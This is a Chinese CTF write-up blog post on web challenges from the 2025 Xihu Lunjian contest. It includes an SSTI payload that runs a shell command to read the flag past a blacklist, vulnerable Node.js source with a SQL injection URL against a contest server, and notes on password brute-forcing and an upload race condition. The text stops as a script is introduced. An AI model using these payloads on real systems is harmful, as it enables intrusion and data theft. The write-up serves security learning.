<!doctype html>
<html lang="zh"><head>
<title>2025西湖论剑WP - “我不是二次元!”</title>
<meta name="msvalidate.01" content="1FF1CDAB89F73F47F09FDB7EE1059FDE" />
<meta name="google-site-verification" content="h9oKh1TF3yoRruKT3WlUVZjvkSiR172joz61JoqHXCM" />
<meta charset="UTF-8">
<meta name="keywords" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">

<link rel="shortcut icon" href="/images/2.ico" type="image/x-icon" />
<meta name="description" content="金石滩小鲨鱼-解题思路1.团队信息团队名称：金石滩小鲨鱼 2.解题情况 3.具体WP签到欢迎来到第八届西湖论剑大赛 WebRank-l但测试后存在部分过滤，随便上网找现成的 payload 打一下，发现能用。 https:&#x2F;&#x2F;tttang.com&#x2F;archive&#x2F;1698&#x2F;#toc_payload  先看源码，发现黑名单  Unicode 编码绕过即可   1&#123;&#123;x.__ini">
<meta property="og:type" content="article">
<meta property="og:title" content="2025西湖论剑WP">
<meta property="og:url" content="https://m1racle-7.github.io/2025/03/03/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/index.html">
<meta property="og:site_name" content="“我不是二次元!”">
<meta property="og:description" content="金石滩小鲨鱼-解题思路1.团队信息团队名称：金石滩小鲨鱼 2.解题情况 3.具体WP签到欢迎来到第八届西湖论剑大赛 WebRank-l但测试后存在部分过滤，随便上网找现成的 payload 打一下，发现能用。 https:&#x2F;&#x2F;tttang.com&#x2F;archive&#x2F;1698&#x2F;#toc_payload  先看源码，发现黑名单  Unicode 编码绕过即可   1&#123;&#123;x.__ini">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188009874-b0760613-8fef-4f9d-b359-09eed5bd6b04.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737190075599-b137fd66-74ff-44b3-91f2-ad15b3bab32d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737174251646-944483b9-4582-46b0-8580-6b5a639fb3d3.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737174754501-58afd1a1-c305-4905-a1ef-f6765d898541.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737175307007-53f43290-9929-42a4-bf11-c04658586ddd.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737175487617-70fa4111-80d3-45a3-a863-9b25905c827c.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188351328-dac22752-3faa-4da9-a5ea-2c9b79332aff.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189775426-e8839a96-26b4-4d68-81fa-feb046e6d7b3.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737186115641-ea4737eb-b1a3-4bc5-9b6d-d8340d277968.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737186176320-aae535ec-ea29-4f7e-8897-acec0accccdd.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737186186070-c96460f7-16e3-485a-9840-ef2d8bdcc448.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197543511-07204c8b-b310-4cb8-ac91-68c837f80d0a.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197608245-720cd9eb-1ad8-45c7-b3c0-fcf1d6fdf150.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197646763-3879e455-2aa6-4a29-9960-65a7e695a5a5.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197668672-7c62f685-7dd5-4f91-9e39-fc0669e91aba.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197696548-18101a84-7370-4058-bac2-51a4713d2a1d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737196536240-a3f2c217-bf87-4988-b254-6177506ef6c2.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737195808042-05956a5f-bafe-49f3-afae-516428fadc24.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197106078-c03f9ef7-5fda-4494-90aa-c31dab504b77.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737197402309-88bb528c-c7e7-42f8-a9ae-2445113cb38d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/f8f07d4c8edd0f6ae936970f3e7f97ec.svg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188289572-1d97f067-ecb1-4b95-8aec-5fc8feca5474.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188341582-ecf089a0-4b33-4d8e-a94e-c1f43ebbd85d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188432992-79562d3b-5c1b-4dc8-b590-3235dbfb030c.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188599396-d9f0c0e1-046f-4f71-bcfb-487aec802141.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188626252-c1ca018a-2563-43c1-81c4-41e5a2ceb502.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737191080331-92761799-490d-44d5-8dfd-86dc690c27cb.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737191029630-964e3155-40c6-4389-935e-99aaacddcaf3.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189883929-a03876e9-3bd1-426f-9e70-12f67e969565.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189917735-542504b6-e33a-4a76-9995-89ebe909b06b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189881991-541c9b61-cb06-44bd-bde0-8375cb768ee2.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189807617-f7685156-1aee-4681-ab1d-46cc9dd8fd89.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189586576-c32e9def-c21b-47e8-85f9-d8b7ae9ba793.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189644814-8d8a9c84-bcd3-4ff1-804f-698c7f06c79b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189698867-bff0e39d-dca9-4c16-837d-d69d88a003c4.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189492496-aec25c24-464c-4d3b-968f-e81daa3fea42.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189759327-ecb9114c-3ab0-49f5-a416-d7ce12df63cc.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189547779-4c7ece84-5be8-4153-b5a6-739e20059ca7.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189669963-a7b00e45-1b78-41ee-9a6d-360f7548ddaf.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188843534-4295e425-cf19-40f7-8f33-14706545a0c4.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188977130-a3f5fc87-eb28-4f8a-9786-7b9188493db5.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189167315-7ef97e0c-d5f5-4b9a-a280-ead5bdc5d896.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189302033-2adecec7-5435-410e-8bf8-a12a3dcd4369.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737194299081-da72c9ea-2cab-42df-940f-fb5207cec260.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737194180629-008c50bf-7fa4-4dc9-b2a4-75d92bc4d6c7.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737194354896-d6c94554-0288-4576-ba24-735535a4b90b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737194247972-467719d5-34ca-4908-9b14-df3d06c0cd1b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737194187345-b65d7461-9407-41e8-850a-ab4e933ee977.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737212498603-b5498d04-6048-416e-acae-54158e803dc8.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737196023983-823561b2-34d2-4370-ab10-2c17b224eb86.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737196008031-7f2d896a-8cc5-4bc1-8408-10015234a522.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737196833241-25e823bb-42c0-4d5f-990c-b67ef1e6792f.png">
<meta property="article:published_time" content="2025-03-03T07:43:42.300Z">
<meta property="article:modified_time" content="2025-03-03T07:44:39.809Z">
<meta property="article:author" content="Miracle">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188009874-b0760613-8fef-4f9d-b359-09eed5bd6b04.png">

<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1740987897917">

<link rel="stylesheet" href="/css/style.css?v=1740987897917">




    
        <link rel="stylesheet" href="/custom.css?v=1740987897917">
    



<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>
<script src="/lib/lax.min.js" async></script>


<script async src="/js/app.js?v=1740987897917"></script>

 

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag("js", new Date());

  gtag("config", "G-4D4ZJ9G024");
</script>


<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(/images/b.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Miracle"><img src="/images/a.jpg" alt="Miracle"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Miracle">
            <img src="/images/a.jpg" alt="Miracle" alt="Miracle">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>10</div>
        <div><span>标签</span>4</div>
        <div><span>分类</span>4</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="友链">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                友链
            </div>
        </a>
        
    </div>
    
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
        
            <form id="search_form">
                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
                    font-size: 15px !important;
                    height: 56px !important;
                    background-image: none;
                "></label>
            </form>
         
    </div>
</div>


	<script async src="/js/search.js?v=1740987897917"></script>



    
        
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/CTF/">CTF</a>
          <span class="category-list-count">6</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/PHP/">PHP</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/linux/">linux</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/内网/">内网</a>
          <span class="category-list-count">1</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 10px;">内网</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(4);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

    
        
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">9</span></li></ul>
    </div>
  </div>



    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">最新文章</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/2025/03/03/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">2025西湖论剑WP</a>
          </li>
        
          <li>
            <a href="/2024/12/16/2024%20CISCNx%E9%93%81%E4%B8%89-WP-By%20Rweboy/">2024 CISCNx铁三-WP-By Rweboy</a>
          </li>
        
          <li>
            <a href="/2024/11/11/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFWP/">2024鹏城杯WP</a>
          </li>
        
          <li>
            <a href="/2024/11/04/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E8%AE%A4%E8%AF%81/">域渗透之Kerberos认证</a>
          </li>
        
          <li>
            <a href="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WriteUp/">网鼎杯-青龙组WP</a>
          </li>
        
      </ul>
    </div>
  </div>

    
   
    <div class="nexmoe-copyright">
        &copy; 2025 Miracle
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
        <div style="font-size: 13px">
            <link rel="stylesheet" href="https://widget.heweather.net/standard/static/css/he-standard.css?v=1.4.0"><script src="https://widget.heweather.net/standard/static/js/he-standard.js?v=1.4.0"></script><script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            本站总访问量  <a id="busuanzi_value_site_pv"></a> 次<br>
            本站访客数<a id="busuanzi_value_site_uv"></a>人次
    </div>
    </div>
</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover"> 
            <img src="/images/b.png" alt="2025西湖论剑WP" loading="lazy">
            <h1>2025西湖论剑WP</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2025年03月03日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
        
        
    <a><i class="nexmoefont icon-areachart"></i>约3.4k字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要17分钟</a>

    </div>
    
    
    
    
    
</div>

    <h1 id="金石滩小鲨鱼-解题思路"><a href="#金石滩小鲨鱼-解题思路" class="headerlink" title="金石滩小鲨鱼-解题思路"></a>金石滩小鲨鱼-解题思路</h1><h2 id="1-团队信息"><a href="#1-团队信息" class="headerlink" title="1.团队信息"></a>1.团队信息</h2><p>团队名称：金石滩小鲨鱼</p>
<h2 id="2-解题情况"><a href="#2-解题情况" class="headerlink" title="2.解题情况"></a>2.解题情况</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188009874-b0760613-8fef-4f9d-b359-09eed5bd6b04.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="3-具体WP"><a href="#3-具体WP" class="headerlink" title="3.具体WP"></a>3.具体WP</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h4 id="欢迎来到第八届西湖论剑大赛"><a href="#欢迎来到第八届西湖论剑大赛" class="headerlink" title="欢迎来到第八届西湖论剑大赛"></a>欢迎来到第八届西湖论剑大赛</h4><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737190075599-b137fd66-74ff-44b3-91f2-ad15b3bab32d.png" alt="img" data-caption="img" loading="lazy"></p>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h4><p>但测试后存在部分过滤，随便上网找现成的 payload 打一下，发现能用。</p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1698/#toc_payload">https://tttang.com/archive/1698/#toc_payload</a></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737174251646-944483b9-4582-46b0-8580-6b5a639fb3d3.png" alt="img" data-caption="img" loading="lazy"></p>
<p>先看源码，发现黑名单</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737174754501-58afd1a1-c305-4905-a1ef-f6765d898541.png" alt="img" data-caption="img" loading="lazy"></p>
<p>Unicode 编码绕过即可</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737175307007-53f43290-9929-42a4-bf11-c04658586ddd.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737175487617-70fa4111-80d3-45a3-a863-9b25905c827c.png" alt="img" data-caption="img" loading="lazy"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;head+\u002f\u0066\u006c\u0061\u0067\u0066\u0031\u0034\u0039&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sqli-or-not"><a href="#sqli-or-not" class="headerlink" title="sqli or not"></a>sqli or not</h4><p>给了源码，下面测试一下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>(); <span class="comment">// 需要创建 express 实例</span></span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>(); <span class="comment">// 创建路由实例</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">info</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/\,/ig</span>)) &#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&#x27;hacker1!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> info = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">info</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Received info:&#x27;</span>, info);</span><br><span class="line">    <span class="keyword">if</span> (info.<span class="property">username</span> &amp;&amp; info.<span class="property">password</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> username = info.<span class="property">username</span>;</span><br><span class="line">      <span class="keyword">var</span> password = info.<span class="property">password</span>;</span><br><span class="line">      <span class="keyword">if</span> (info.<span class="property">username</span>.<span class="title function_">match</span>(<span class="regexp">/\&#x27;|\&quot;|\\/</span>) || info.<span class="property">password</span>.<span class="title function_">match</span>(<span class="regexp">/\&#x27;|\&quot;|\\/</span>)) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;hacker2!&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> sql = <span class="string">&quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;</span>;</span><br><span class="line">      sql = sql.<span class="title function_">replace</span>(<span class="string">&quot;&#123;username&#125;&quot;</span>, username);</span><br><span class="line">      sql = sql.<span class="title function_">replace</span>(<span class="string">&quot;&#123;password&#125;&quot;</span>, password);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Received sql:&#x27;</span>, sql);</span><br><span class="line"></span><br><span class="line">      connection.<span class="title function_">query</span>(sql, <span class="keyword">function</span> (<span class="params">err, rs</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          res.<span class="title function_">end</span>(<span class="string">&#x27;error1&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (rs.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            res.<span class="title function_">sendFile</span>(<span class="string">&#x27;/flag&#x27;</span>); </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">end</span>(<span class="string">&#x27;username or password error&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;please input the data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;please input the data&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定路由</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, router);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>参考一下 ctfshow 的ctfshow344 来绕过逗号</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188351328-dac22752-3faa-4da9-a5ea-2c9b79332aff.png" alt="img" data-caption="img" loading="lazy"></p>
<p>接下来就是绕过’”和 \</p>
<p>搜索到<a target="_blank" rel="noopener" href="https://blog.finalize.ink/2020/12/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-babyjs%E5%A4%8D%E7%8E%B0/#0x02-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-url.parse">https://blog.finalize.ink/2020/12/08/%e7%bd%91%e9%bc%8e%e6%9d%af2020-babyjs%e5%a4%8d%e7%8e%b0/#0x02-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-url.parse</a></p>
<p>网鼎 2020 半决的一道 js 题，使用二次编码和@前会被url解码绕过的单引号，但是他的是url.parse 函数，可惜了。</p>
<p>之后翻看match 和 replace 函数的官方文档，发现了 replace 的一个特性：</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189775426-e8839a96-26b4-4d68-81fa-feb046e6d7b3.png" alt="img" data-caption="img" loading="lazy"></p>
<p><code>$反引号插入匹配子字符串之前的字符串片段,如果我们 username 中输入$反引号</code> 的话，那么他之前的片段就是select * from userinfo where username &#x3D; ‘这一段，这样就可以帮助我们闭合前面的单引号了，至于后面那些只需要#全部给注释掉即可。</p>
<p>最终 payload：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.155.126.78:18056/?info=&#123;&quot;username&quot;:&quot;$` or 1=1%23&quot;&amp;info=&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Rank-U"><a href="#Rank-U" class="headerlink" title="Rank-U"></a>Rank-U</h4><p>登录框，密码爆破之后发现密码为 admin&#x2F;year2000，登陆后是文件上传，发现什么都能上传，但除图片之外其余的都会被删掉，考虑条件竞争，拷打 GPT 编写脚本得到如下内容:</p>
